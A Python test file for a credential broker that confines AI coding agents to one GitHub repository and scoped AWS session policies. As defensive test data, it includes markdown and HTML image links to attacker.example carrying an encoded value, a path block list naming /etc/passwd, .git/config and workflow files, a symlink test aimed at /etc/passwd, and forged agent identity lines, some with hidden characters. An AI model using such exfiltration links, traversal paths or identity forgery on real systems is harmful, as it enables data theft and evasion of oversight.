"""Local tests of the broker with the repositories on GitHub.

These tests need no AWS account and no GitHub account. A stand-in answers the requests of the broker
to the GitHub REST API from a repository in memory, and records every request.

Usage: python -m tests.test_github        (adds its results to .build/unit-results.json)
"""
import json
import sys
import time
import urllib.parse

import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

from tests.local import ACCOUNT, IDENTITY_SETTINGS, REGION, SESSION_ID, package, report, save

OWNER = "example-owner"
SETTINGS = {
    **IDENTITY_SETTINGS, "token_role_prefix": "agentfarm-runtime-exec-",
    "agent_role_arn": f"arn:aws:iam::{ACCOUNT}:role/agentfarm-runtime-agent", "stack_prefix": "agentfarm-",
    "session_table": "agentfarm-runtime-sessions", "github_owner": OWNER, "github_app_secret_prefix": "agentfarm/github-app/",
    # agent-beta has a KMS key for the private key of its GitHub App; agent-alpha has none.
    "github_app_kms_agents": ["agent-beta"], "github_app_key_alias_prefix": "alias/agentfarm/github-app/",
    "github_app_signing_algorithm": "RSASSA_PKCS1_V1_5_SHA_256",
    "github_app_settings_prefix": "/agentfarm-settings/github-app/",
}
package(["broker/handler.py", "broker/github.py", "shared/identity.py"], SETTINGS)

import github  # noqa: E402
import handler as broker  # noqa: E402

REPOSITORY = "agentfarm-greeting-service"
IDENTITY = {"agent_id": "agent-alpha", "session_id": SESSION_ID, "repository": REPOSITORY}
BRANCH = f"agent/{SESSION_ID}"
LINES = f"Agent-Id: agent-alpha\nSession-Id: {SESSION_ID}"
TOKEN = "ghs_installation-token-of-the-test"


class FakeGitHub:
    """A repository in memory that answers the requests of the broker, and a record of the requests."""
    def __init__(self) -> None:
        self.requests, self.count = [], 0
        self.trees = {"tree-0": {"README.md": "# greeting-service\n", "template.yaml": 'Value: "Hello"\n'}}
        self.commits = {"commit-0": {"message": "Initial content", "tree": "tree-0", "parents": []}}
        self.refs = {"main": "commit-0"}
        self.pulls = []
        # The entries of the repository that are not plain files: {path: {"mode", "type"}}.
        self.special = {}

    def _next(self, kind: str) -> str:
        self.count += 1
        return f"{kind}-{self.count}"

    def __call__(self, method: str, url: str, token: str, body: dict | None = None, raw: bool = False,
                 limit: int | None = None):
        self.requests.append({"method": method, "url": url, "token": token, "body": body})
        path = url.split(f"/repos/{OWNER}/{REPOSITORY}", 1)[-1]
        if url.endswith("/access_tokens"):
            return {"token": TOKEN}
        if method == "GET" and path.startswith("/git/ref/heads/"):
            branch = urllib.parse.unquote(path[len("/git/ref/heads/"):])
            if branch not in self.refs:
                raise github.GitHubError(404, "Not Found")
            return {"object": {"sha": self.refs[branch]}}
        if method == "GET" and path.startswith("/git/commits/"):
            commit = self.commits[path.rsplit("/", 1)[-1]]
            return {"message": commit["message"], "tree": {"sha": commit["tree"]}}
        if method == "GET" and path.startswith("/git/trees/"):
            tree = self.trees[self.commits[path.split("/")[3].split("?")[0]]["tree"]]
            return {"tree": [{"path": name, "type": "blob", "mode": "100644", **self.special.get(name, {})} for name in tree]}
        if method == "GET" and path.startswith("/contents/"):
            name, commit = path[len("/contents/"):].split("?ref=")
            content = self.trees[self.commits[commit]["tree"]][urllib.parse.unquote(name)]
            content = content if isinstance(content, bytes) else content.encode()
            return content[:limit + 1] if limit is not None else content
        if method == "POST" and path == "/git/trees":
            sha = self._next("tree")
            tree = dict(self.trees[body["base_tree"]])
            for entry in body["tree"]:
                if "content" in entry:
                    tree[entry["path"]] = entry["content"]
                else:   # "sha": None deletes the entry
                    tree.pop(entry["path"])
            self.trees[sha] = tree
            return {"sha": sha}
        if method == "POST" and path == "/git/commits":
            sha = self._next("commit")
            self.commits[sha] = {"message": body["message"], "tree": body["tree"], "parents": body["parents"]}
            return {"sha": sha}
        if method == "POST" and path == "/git/refs":
            self.refs[body["ref"].removeprefix("refs/heads/")] = body["sha"]
            return {}
        if method == "PATCH" and path.startswith("/git/refs/heads/"):
            self.refs[urllib.parse.unquote(path[len("/git/refs/heads/"):])] = body["sha"]
            return {}
        if method == "GET" and path.startswith("/commits/"):
            return {"author": {"login": "agentfarm-agent-alpha[bot]"}, "commit": {"author": {"name": "agentfarm-agent-alpha[bot]"}}}
        if method == "POST" and path == "/pulls":
            if any(p["head"] == body["head"] for p in self.pulls):
                raise github.GitHubError(422, "A pull request already exists")
            self.pulls.append({**body, "number": len(self.pulls) + 1, "html_url": "https://github.example/pull/1",
                               "user": {"login": "agentfarm-agent-alpha[bot]"}})
            return self.pulls[-1]
        if method == "GET" and path.startswith("/pulls?"):
            return self.pulls
        raise AssertionError(f"request without an answer: {method} {path}")

    def of(self, method: str, suffix: str) -> list[dict]:
        return [r for r in self.requests if r["method"] == method and r["url"].split("?")[0].endswith(suffix)]


def run() -> list[dict]:
    results = []

    def record(group: str, name: str, passed: bool, detail: str) -> None:
        results.append({"group": f"github: {group}", "case": name, "passed": bool(passed), "detail": detail})

    def invalid(call) -> str | None:
        try:
            call()
            return None
        except broker.Invalid as error:
            return str(error)

    # ---- The installation access token of the App of the agent
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pem = key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()).decode()
    fake = FakeGitHub()
    token = github.installation_token({"app_id": "12345", "installation_id": "67890", "private_key": pem}, REPOSITORY, fake)
    request = fake.requests[0]
    app_claims = jwt.decode(request["token"], key.public_key(), algorithms=["RS256"])
    record("token", "the broker signs a JWT of the App and asks for a token for the repository of the session only",
           token == TOKEN and request["url"] == f"{github.API}/app/installations/67890/access_tokens"
           and request["body"]["repositories"] == [REPOSITORY] and app_claims["iss"] == "12345"
           and app_claims["exp"] - int(time.time()) <= 600
           and request["body"]["permissions"] == {"contents": "write", "pull_requests": "write", "metadata": "read"},
           json.dumps({"url": request["url"], "body": request["body"], "lifetime of the App JWT": app_claims["exp"] - app_claims["iat"]}))

    # ---- The private key of the App in AWS KMS: the broker asks for the signature and has no key
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import padding

    class FakeKms:
        """Signs as AWS KMS does for RSASSA_PKCS1_V1_5_SHA_256, and records the requests."""
        def __init__(self) -> None:
            self.requests = []

        def sign(self, **request) -> dict:
            self.requests.append({k: v for k, v in request.items() if k != "Message"})
            return {"Signature": key.sign(request["Message"], padding.PKCS1v15(), hashes.SHA256())}

    class FakeSecrets:
        def __init__(self, secrets: dict) -> None:
            self.secrets = secrets

        def get_secret_value(self, SecretId: str) -> dict:
            return {"SecretString": json.dumps(self.secrets[SecretId])}

    fake_kms = FakeKms()
    fake = FakeGitHub()
    token = github.installation_token({"app_id": "12345", "installation_id": "67890"}, REPOSITORY, fake,
                                      sign=lambda message: fake_kms.sign(Message=message)["Signature"])
    app_claims = jwt.decode(fake.requests[0]["token"], key.public_key(), algorithms=["RS256"])
    record("key in AWS KMS", "with a signature from outside, the JWT of the App is valid for the public key, with the same "
           "claims and the same lifetime, and the secret needs no private key",
           token == TOKEN and app_claims["iss"] == "12345" and app_claims["exp"] - app_claims["iat"] == 600
           and jwt.get_unverified_header(fake.requests[0]["token"]) == {"alg": "RS256", "typ": "JWT"},
           json.dumps({"claims": app_claims, "header": jwt.get_unverified_header(fake.requests[0]["token"])}))

    class FakeSsm:
        """The SSM parameters of the test, and a record of the names that the broker asked for."""
        def __init__(self, values: dict) -> None:
            self.values, self.requests = values, []

        def get_parameters(self, Names: list) -> dict:
            self.requests.append(Names)
            return {"Parameters": [{"Name": name, "Value": self.values[name]} for name in Names if name in self.values]}

    beta = "/agentfarm-settings/github-app/agent-beta/"
    secrets = FakeSecrets({
        "agentfarm/github-app/agent-alpha": {"app_id": "111", "installation_id": "67890"},
        "agentfarm/github-app/agent-gamma": {"app_id": "333", "installation_id": "67890", "private_key": pem}})
    real_client, real_token = broker.session_client, github.installation_token
    fake_kms, fake, parameters = FakeKms(), FakeGitHub(), FakeSsm({beta + "app_id": "222", beta + "installation_id": "67890"})
    read_secrets = []

    def client(service: str, credentials: dict):
        if service == "secretsmanager":
            read_secrets.append(service)
        return {"secretsmanager": secrets, "kms": fake_kms, "ssm": parameters}[service]

    broker.session_client = client
    github.installation_token = lambda app, repository, sign=None: real_token(app, repository, fake, sign)
    try:
        with_kms = broker._github_repository({}, {**IDENTITY, "agent_id": "agent-beta"})
        kms_claims = jwt.decode(fake.requests[-1]["token"], key.public_key(), algorithms=["RS256"])
        record("key in AWS KMS", "for an agent with a KMS key the broker reads the two IDs of the App from the SSM "
               "parameters of the agent, asks AWS KMS for the signature (the alias of the agent, the algorithm RS256, "
               "the message as it is), and reads no secret",
               with_kms.app_key == "kms" and kms_claims["iss"] == "222" and read_secrets == []
               and parameters.requests == [[beta + "app_id", beta + "installation_id"]]
               and fake.requests[-1]["url"].endswith("/app/installations/67890/access_tokens")
               and fake_kms.requests == [{"KeyId": "alias/agentfarm/github-app/agent-beta", "MessageType": "RAW",
                                          "SigningAlgorithm": "RSASSA_PKCS1_V1_5_SHA_256"}],
               json.dumps({"parameters": parameters.requests, "request to AWS KMS": fake_kms.requests,
                           "issuer of the JWT": kms_claims["iss"], "secrets read": len(read_secrets)}))
        not_set = {}
        for name, values in (("the value of the stack", {beta + "app_id": "not-set", beta + "installation_id": "not-set"}),
                             ("one parameter only", {beta + "app_id": "222"}),
                             ("a value that is not a number", {beta + "app_id": "222", beta + "installation_id": "1/../2"})):
            parameters.values = values
            not_set[name] = invalid(lambda: broker._github_repository({}, {**IDENTITY, "agent_id": "agent-beta"}))
        record("key in AWS KMS", "IDs that are not set, or not numbers: the broker refuses the request and sends AWS KMS "
               "and GitHub no request", all(not_set.values()) and len(fake_kms.requests) == 1 and len(fake.requests) == 1,
               json.dumps(not_set))
        with_secret = broker._github_repository({}, {**IDENTITY, "agent_id": "agent-gamma"})
        record("key in AWS KMS", "for an agent without a KMS key the broker signs with the private key of the secret, and "
               "sends AWS KMS and SSM no request",
               with_secret.app_key == "secret" and len(fake_kms.requests) == 1 and len(parameters.requests) == 4,
               f"key of the App: {with_secret.app_key}; requests to AWS KMS: {len(fake_kms.requests)}")
        refused = invalid(lambda: broker._github_repository({}, IDENTITY))
        record("key in AWS KMS", "a secret without a private key, for an agent without a KMS key: the broker refuses the "
               "request and sends AWS KMS no request", bool(refused) and len(fake_kms.requests) == 1, str(refused))
    finally:
        broker.session_client, github.installation_token = real_client, real_token
    kms_policy = json.loads(broker.session_policy(SESSION_ID, REPOSITORY, "agent-beta", broker.REPOSITORY_ACCESS))
    plain_policy = broker.session_policy(SESSION_ID, REPOSITORY, "agent-alpha", broker.REPOSITORY_ACCESS)
    by_action = {statement["Action"]: statement for statement in kms_policy["Statement"]}
    stack_policy = broker.session_policy(SESSION_ID, REPOSITORY, "agent-beta", broker.STACK_ACCESS)
    record("key in AWS KMS", "the session policy for the repository of an agent with a KMS key permits the read of the "
           "parameters of the agent and a signature with the alias of the agent, with one algorithm, in a direct "
           "request, and no secret; the policy for the stack has neither, and the policy of an agent without a KMS "
           "key has the secret only",
           sorted(by_action) == ["kms:Sign", "ssm:GetParameters"]
           and by_action["ssm:GetParameters"]["Resource"].endswith(":parameter/agentfarm-settings/github-app/agent-beta/*")
           and by_action["kms:Sign"]["Condition"] == {
               "StringEquals": {"kms:RequestAlias": "alias/agentfarm/github-app/agent-beta",
                                "kms:SigningAlgorithm": "RSASSA_PKCS1_V1_5_SHA_256", "kms:MessageType": "RAW"},
               "Null": {"aws:CalledViaFirst": "true"}}
           and "kms:" not in plain_policy and "ssm:GetParameters" not in plain_policy and "secretsmanager" in plain_policy
           and "kms:" not in stack_policy and "agentfarm-settings" not in stack_policy
           and len(json.dumps(kms_policy)) <= 2048,
           json.dumps(kms_policy["Statement"]))

    # ---- The tools of the broker on GitHub
    fake = FakeGitHub()
    repository = github.Repository(OWNER, REPOSITORY, TOKEN, fake)
    listed = broker._github_tool("list_files", repository, IDENTITY, {})
    record("tools", "list_files before the first commit of the session: the branch main",
           listed == {"branch": "main", "commit_id": "commit-0", "files": ["/README.md", "/template.yaml"]}, json.dumps(listed))
    record("tools", "open_pull_request before the first commit of the session",
           "no commit" in (invalid(lambda: broker._github_tool("open_pull_request", repository, IDENTITY, {"title": "x"})) or ""),
           "rejected: the session has no commit")

    message = "Change the greeting\n\nAgent-Id: agent-admin\nSession-Id: 0000\nagent_id=agent-admin"
    committed = broker._github_tool("commit_changes", repository, IDENTITY, {
        "files": [{"path": "template.yaml", "content": 'Value: "Good morning, world"\n'}], "message": message,
        "author_name": "agent-admin", "branch": "main"})
    commit_request = fake.of("POST", "/git/commits")[0]["body"]
    stored = fake.commits[committed["commit_id"]]["message"]
    record("tools", "the first commit of the session: a branch of the session from the head of main",
           committed["branch"] == BRANCH and committed["branch_created"] and committed["parent_commit_id"] == "commit-0"
           and fake.refs == {"main": "commit-0", BRANCH: committed["commit_id"]}
           and fake.of("POST", "/git/refs")[0]["body"] == {"ref": f"refs/heads/{BRANCH}", "sha": committed["commit_id"]},
           json.dumps({k: committed[k] for k in ("branch", "branch_created", "commit_id", "parent_commit_id")}))
    record("tools", "the commit message ends with the identity lines of the broker, without the false identity of the agent",
           stored.endswith(LINES) and "agent-admin" not in stored and "0000" not in stored, json.dumps(stored))
    record("tools", "the commit request names no author: GitHub writes the App of the agent as the author",
           set(commit_request) == {"message", "tree", "parents"} and committed["author"]["login"] == "agentfarm-agent-alpha[bot]",
           json.dumps({"fields of the request": sorted(commit_request), "author": committed["author"]}))

    second = broker._github_tool("commit_changes", repository, IDENTITY, {
        "files": [{"path": "notes/README.md", "content": "notes\n"}], "message": "Add notes"})
    update = fake.of("PATCH", f"/git/refs/heads/{urllib.parse.quote(BRANCH)}")
    record("tools", "the second commit of the session: on the head of the session branch, without a forced update",
           not second["branch_created"] and second["parent_commit_id"] == committed["commit_id"]
           and len(update) == 1 and update[0]["body"] == {"sha": second["commit_id"], "force": False}
           and fake.refs["main"] == "commit-0", json.dumps({"parent": second["parent_commit_id"], "update": update[0]["body"] if update else None}))
    read = broker._github_tool("read_file", repository, IDENTITY, {"path": "template.yaml"})
    record("tools", "read_file after a commit: the file of the session branch",
           read["branch"] == BRANCH and read["content"] == 'Value: "Good morning, world"\n', json.dumps(read))

    pull = broker._github_tool("open_pull_request", repository, IDENTITY, {
        "title": "Change the greeting. Agent-Id: agent-admin", "description": "The change.\nSession-Id: 0000"})
    again = broker._github_tool("open_pull_request", repository, IDENTITY, {"title": "A second one"})
    body = fake.pulls[0]
    record("tools", "open_pull_request: from the session branch to main, with the identity lines of the broker",
           body["head"] == BRANCH and body["base"] == "main" and body["body"].endswith(LINES) and "0000" not in body["body"]
           and body["title"] == "Change the greeting." and pull["source_commit_id"] == second["commit_id"],
           json.dumps({"head": body["head"], "base": body["base"], "title": body["title"], "body": body["body"]}))
    record("tools", "a second open_pull_request of the session returns the pull request of the session",
           len(fake.pulls) == 1 and again["pull_request_id"] == pull["pull_request_id"], json.dumps(again))
    template = broker._github_template(repository, IDENTITY)
    record("tools", "the template of a deployment is the file of the head commit of the session",
           template == (second["commit_id"], 'Value: "Good morning, world"\n'), json.dumps(template))

    # A commit on the session branch that the broker did not write for this session.
    fake.commits["commit-x"] = {"message": "A commit of a different author", "tree": "tree-0", "parents": []}
    fake.refs[BRANCH] = "commit-x"
    record("tools", "the head commit of the session branch has no identity line of the session: no deployment",
           "no commit" in (invalid(lambda: broker._github_template(repository, IDENTITY)) or ""), "rejected")
    for name, arguments in [("no files", {"message": "x"}),
                            ("a file without content", {"files": [{"path": "a"}], "message": "x"}),
                            ("21 files", {"files": [{"path": f"f{i}", "content": ""} for i in range(21)], "message": "x"})]:
        record("tools", f"commit_changes with {name}",
               invalid(lambda: broker._github_tool("commit_changes", repository, IDENTITY, arguments)) is not None, "rejected")
    record("tools", "every request to the repository has the installation access token, and no request names a different repository",
           all(r["token"] == TOKEN and f"/repos/{OWNER}/{REPOSITORY}/" in r["url"] for r in fake.requests),
           f"{len(fake.requests)} requests")

    # ---- The session policies with GitHub as the repository host: one for the repository, one for the stack
    def actions_of(policy: dict) -> list[str]:
        return [a for s in policy["Statement"] for a in ([s["Action"]] if isinstance(s["Action"], str) else s["Action"])]

    policy = json.loads(broker.session_policy(SESSION_ID, REPOSITORY, "agent-alpha", broker.REPOSITORY_ACCESS))
    secret = policy["Statement"][0]
    record("session policy", "the credentials for the repository read the secret of the GitHub App of the agent only, and nothing else",
           actions_of(policy) == ["secretsmanager:GetSecretValue"]
           and secret["Resource"] == f"arn:aws:secretsmanager:{REGION}:{ACCOUNT}:secret:agentfarm/github-app/agent-alpha-??????",
           json.dumps({"actions": actions_of(policy), "secret": secret["Resource"]}))
    record("session policy", "only a direct request reads the secret, not a request that an AWS service sends for the session",
           secret.get("Condition") == {"Null": {"aws:CalledViaFirst": "true"}}, json.dumps(secret.get("Condition")))
    stack_policy = json.loads(broker.session_policy(SESSION_ID, REPOSITORY, "agent-alpha", broker.STACK_ACCESS))
    services = sorted({a.split(":")[0] for a in actions_of(stack_policy)})
    record("session policy", "the credentials for the stack have no action on a secret or on a repository",
           services == ["cloudformation", "ssm"] and json.loads(broker.session_policy(SESSION_ID, REPOSITORY, "agent-alpha")) == stack_policy
           and all(SESSION_ID in s["Resource"] for s in stack_policy["Statement"]),
           json.dumps({"services": services, "default purpose": "stack"}))
    try:
        broker.session_policy(SESSION_ID, REPOSITORY, "agent-alpha", "all")
        unknown = "accepted"
    except ValueError:
        unknown = "rejected"
    record("session policy", "a purpose that is not the repository or the stack has no policy", unknown == "rejected", unknown)

    # ---- deploy_stack: the template comes with the credentials for the repository, and AWS CloudFormation gets
    # the credentials for the stack. A template of the agent cannot read the secret through AWS CloudFormation.
    kept = (broker.session_client, broker._github_repository, broker._github_template, broker._deploy_stack, broker._github_tool)
    asked = []

    def credentials(purpose: str) -> dict:
        asked.append(purpose)
        return {"AccessKeyId": purpose, "SecretAccessKey": "x", "SessionToken": "y"}

    try:
        broker.session_client = lambda service, made: (service, made["AccessKeyId"])
        broker._github_repository = lambda made, identity: {"credentials": made["AccessKeyId"]}
        broker._github_template = lambda repository, identity: ("commit", f"template read with {repository['credentials']}")
        broker._deploy_stack = lambda template, cloudformation, identity, stack_name: {"template": template[1], "cloudformation": cloudformation}
        deployed = broker.run_tool("deploy_stack", {}, credentials, IDENTITY, "stack")
        deploy_asked = list(asked)
        asked.clear()
        broker._github_tool = lambda tool, repository, identity, arguments: {"credentials": repository["credentials"]}
        read = broker.run_tool("read_file", {"path": "a"}, credentials, IDENTITY, "stack")
        read_asked = list(asked)
    finally:
        (broker.session_client, broker._github_repository, broker._github_template, broker._deploy_stack,
         broker._github_tool) = kept
    record("tools", "deploy_stack reads the template with the credentials for the repository and gives AWS CloudFormation the credentials for the stack",
           deployed == {"template": "template read with repository", "cloudformation": ("cloudformation", "stack")}
           and deploy_asked == ["repository", "stack"],
           json.dumps({"result": deployed, "credentials requested": deploy_asked}))
    record("tools", "a repository tool gets the credentials for the repository only",
           read == {"credentials": "repository"} and read_asked == ["repository"], json.dumps(read_asked))
    # ---- The lines of the broker and the words that close an issue
    with_issue = {**IDENTITY, "issue_number": 12}
    text = "Fixes #12 and fixes #5. Closes: other/repository#7, resolved https://github.com/o/r/issues/9\nIssue: #99\nissue : #98"
    cleaned = broker.without_identity_keys(text, 12)
    record("issue line", "a word that closes an issue stays only for the issue of the session",
           cleaned == "Fixes #12 and See #5. See: other/repository#7, See https://github.com/o/r/issues/9", json.dumps(cleaned))
    record("issue line", "without an issue of the session, no word closes an issue",
           broker.without_identity_keys("Fixes #12, closes #120") == "See #12, See #120", json.dumps(broker.without_identity_keys("Fixes #12, closes #120")))
    signed = broker.signed_text("A change.\nIssue: #99\nAgent-Id: agent-beta", with_issue)
    record("issue line", "the broker writes the issue of the session before the identity lines, and removes an issue line of the agent",
           signed == f"A change.\n\nIssue: #12\nAgent-Id: agent-alpha\nSession-Id: {SESSION_ID}", json.dumps(signed))
    record("issue line", "a session without an issue has no issue line",
           broker.signed_text("A change.", IDENTITY) == f"A change.\n\nAgent-Id: agent-alpha\nSession-Id: {SESSION_ID}", "two lines of the broker")

    # ---- The paths that a session cannot write
    def refused(path: str) -> bool:
        try:
            broker._files({"files": [{"path": path, "content": "x"}]})
            return False
        except broker.Invalid:
            return True

    bad = [".github/workflows/agentfarm.yml", ".GitHub/workflows/new.yml", "a/../.github/workflows/x.yml", "./.github/x",
           ".git/config", "/etc/passwd", "../outside", "a//b", "a\\b", ".gitattributes", "src/.gitattributes", ".GitAttributes"]
    good = ["template.yaml", "src/app.py", "docs/.github.md", "github/workflows/x.yml", "docs/gitattributes.md"]

    def deletion_refused(path: str) -> bool:
        try:
            broker._files({"files": [{"path": path, "delete": True}]})
            return False
        except broker.Invalid:
            return True

    record("paths", "a session cannot delete a workflow or a file that says how the repository host shows a change",
           deletion_refused(".github/workflows/agentfarm.yml") and deletion_refused(".gitattributes")
           and not deletion_refused("src/old.py"), "refused: .github/workflows/agentfarm.yml, .gitattributes")
    record("paths", "one path, one time in a commit",
           invalid(lambda: broker._files({"files": [{"path": "a", "content": "1"}, {"path": "a", "delete": True}]})) is not None,
           "rejected")
    record("paths", "a session cannot write a workflow, a file of git, a file .gitattributes, or a path that is not one plain relative path",
           all(refused(path) for path in bad) and not any(refused(path) for path in good),
           json.dumps({"refused": [path for path in bad if refused(path)], "accepted": [path for path in good if not refused(path)]}))

    # ---- What a commit keeps and what it refuses: the mode of a file, a deletion, a symbolic link
    fake = FakeGitHub()
    fake.trees["tree-0"].update({"run.sh": "#!/bin/sh\necho 1\n", "old.py": "x = 1\n", "link": "run.sh", "vendor": ""})
    fake.special = {"run.sh": {"mode": "100755"}, "link": {"mode": "120000"}, "vendor": {"mode": "160000", "type": "commit"}}
    repository = github.Repository(OWNER, REPOSITORY, TOKEN, fake)
    changed = broker._github_tool("commit_changes", repository, IDENTITY, {"message": "Change the script", "files": [
        {"path": "run.sh", "content": "#!/bin/sh\necho 2\n"}, {"path": "new.py", "content": "y = 2\n"},
        {"path": "old.py", "delete": True}]})
    entries = {entry["path"]: entry for entry in fake.of("POST", "/git/trees")[0]["body"]["tree"]}
    tree = fake.trees[fake.commits[changed["commit_id"]]["tree"]]
    record("commit", "a file that the repository has keeps its mode: a script stays executable. A new file is a plain file",
           entries["run.sh"]["mode"] == "100755" and entries["new.py"]["mode"] == "100644" and tree["run.sh"].endswith("echo 2\n"),
           json.dumps({path: entry["mode"] for path, entry in entries.items()}))
    record("commit", "a commit deletes a file of the repository",
           entries["old.py"] == {"path": "old.py", "mode": "100644", "type": "blob", "sha": None} and "old.py" not in tree
           and "new.py" in tree, json.dumps(sorted(tree)))

    def refused(arguments: dict) -> str | None:
        try:
            broker._github_tool("commit_changes", repository, IDENTITY, {"message": "x", **arguments})
            return None
        except github.Refused as error:
            return str(error)

    trees_before = len(fake.of("POST", "/git/trees"))
    reasons = {"a symbolic link": refused({"files": [{"path": "link", "content": "/etc/passwd"}]}),
               "a submodule": refused({"files": [{"path": "vendor", "content": "x"}]}),
               "the deletion of a file that the repository does not have": refused({"files": [{"path": "nothing.py", "delete": True}]})}
    record("commit", "a session does not write over a symbolic link or a submodule, and deletes only a file of the repository",
           all(reasons.values()) and len(fake.of("POST", "/git/trees")) == trees_before, json.dumps(reasons))

    # ---- read_file: a complete text file, or no content
    fake = FakeGitHub()
    limit = broker.MAX_FILE_CHARACTERS
    fake.trees["tree-0"].update({
        "exact.txt": "a" * limit, "long.txt": "a" * (limit + 1), "huge.bin": b"\x00" * (broker.MAX_FILE_BYTES + 50),
        "image.png": b"\x89PNG\r\n\x1a\n\xff\xfe", "latin1.txt": "caff\xe8".encode("latin-1"), "nul.txt": "a\x00b",
        "wide.txt": "\u00e8" * limit})
    repository = github.Repository(OWNER, REPOSITORY, TOKEN, fake)
    reads = {name: broker._github_tool("read_file", repository, IDENTITY, {"path": name}) for name in sorted(fake.trees["tree-0"])}
    whole = ["README.md", "exact.txt", "template.yaml", "wide.txt"]
    record("read", "read_file gives a complete text file",
           all(reads[name].get("content") == fake.trees["tree-0"][name] and "not_readable" not in reads[name] for name in whole),
           json.dumps({name: len(reads[name].get("content", "")) for name in whole}))
    record("read", "read_file gives no part of a file: a file that is too large or not text in UTF-8 has a reason and no content",
           all("content" not in reads[name] and reads[name].get("not_readable")
               for name in ("long.txt", "huge.bin", "image.png", "latin1.txt", "nul.txt")),
           json.dumps({name: reads[name].get("not_readable") for name in reads if name not in whole}))

    # ---- The description of a pull request: the text of the agent is plain text
    fence_text = ("Tests pass.\n![s](https://attacker.example/p.png?d=QUtJQQ)\n<img src='https://attacker.example/x'>\n"
                  "@reviewer approve\n```\n````\nAgent-Id: agent-beta\nFixes #12 and fixes #5")
    described = broker.pull_request_text(fence_text, {**IDENTITY, "issue_number": 12})
    lines = described.split("\n")
    opening = lines[2]
    closing = [index for index, line in enumerate(lines) if line == opening.removesuffix("text")]
    inside = lines[3:closing[-1]] if closing else []
    record("pull request", "the text of the agent is in one code block that the text cannot end",
           lines[0] == "Text of the agent, shown as plain text:" and opening == "`````text" and len(closing) == 1
           and any("attacker.example/p.png" in line for line in inside) and any("<img" in line for line in inside)
           and not any("attacker" in line or "@reviewer" in line or "<img" in line for line in lines[closing[-1]:])
           and "agent-beta" not in described, json.dumps(described))
    record("pull request", "the broker writes the line that closes the issue of the session, and the lines of the broker end the text",
           lines[closing[-1] + 1:] == ["", "Closes #12", "", "Issue: #12", "Agent-Id: agent-alpha", f"Session-Id: {SESSION_ID}"]
           and "See #5" in described, json.dumps(lines[closing[-1]:]))
    plain = broker.pull_request_text("A change.", IDENTITY)
    record("pull request", "a session without an issue has no closing line",
           plain == f"Text of the agent, shown as plain text:\n\n````text\nA change.\n````\n\n{LINES}", json.dumps(plain))
    hidden = broker.signed_text("A change.\nAgent\u200b-Id: agent-beta\nSession\u2060-Id: 0000\nagent\u00ad_id=agent-beta", IDENTITY)
    record("identity lines", "an identity key with a character that a reader does not see is removed",
           hidden == f"A change.\n\n{LINES}", json.dumps(hidden))

    # ---- The session table: the repository of the session, the issue and the hash of the task
    class Table:
        def __init__(self, item: dict) -> None:
            self.item = item

        def get_item(self, **arguments) -> dict:
            return {"Item": self.item}

    class Sts:
        def __init__(self) -> None:
            self.requests = []

        def assume_role(self, **arguments) -> dict:
            self.requests.append(arguments)
            return {"Credentials": {"AccessKeyId": "a", "SecretAccessKey": "b", "SessionToken": "c"}}

    kept_table, kept_sts = broker._sessions, broker._sts
    active = {"state": {"S": "active"}, "expires_at": {"N": str(int(time.time()) + 600)}, "repository": {"S": REPOSITORY},
              "issue_number": {"N": "12"}, "task_sha256": {"S": "ab" * 32}}
    try:
        broker._sessions = Table(active)
        facts = broker.session_facts(broker.check_active({**IDENTITY, "jti": "j"}))
        try:
            broker.check_active({**IDENTITY, "repository": "agentfarm-feature-flags", "jti": "j"})
            other = "accepted"
        except broker.Rejected as rejected:
            other = str(rejected)
        broker._sts = Sts()
        broker.session_credentials({**IDENTITY, **facts}, broker.STACK_ACCESS)
        broker.session_credentials(IDENTITY, broker.REPOSITORY_ACCESS)
        requests = broker._sts.requests
    finally:
        broker._sessions, broker._sts = kept_table, kept_sts
    record("session table", "the broker rejects a JWT with a repository that is not the repository of the session",
           other == "the repository of the token is not the repository of the session", other)
    record("session table", "the broker reads the issue and the hash of the task of a session, and only values of the right form",
           facts == {"issue_number": 12, "task_sha256": "ab" * 32}
           and broker.session_facts({"issue_number": {"N": "0"}, "task_sha256": {"S": "not a hash"}}) == {}, json.dumps(facts))
    record("session tags", "the credentials of a session have the issue and the hash of the task as session tags, and a session without them has no tag",
           requests[0].get("Tags") == [{"Key": "issue", "Value": "12"}, {"Key": "task_sha256", "Value": "ab" * 32}]
           and "Tags" not in requests[1] and requests[0]["RoleSessionName"] == SESSION_ID and requests[0]["SourceIdentity"] == "agent-alpha",
           json.dumps({"with an issue": requests[0].get("Tags"), "without": requests[1].get("Tags")}))
    return results


def main() -> int:
    results = run()
    save(results, replaces=("github",))
    return report(results)


if __name__ == "__main__":
    sys.exit(main())
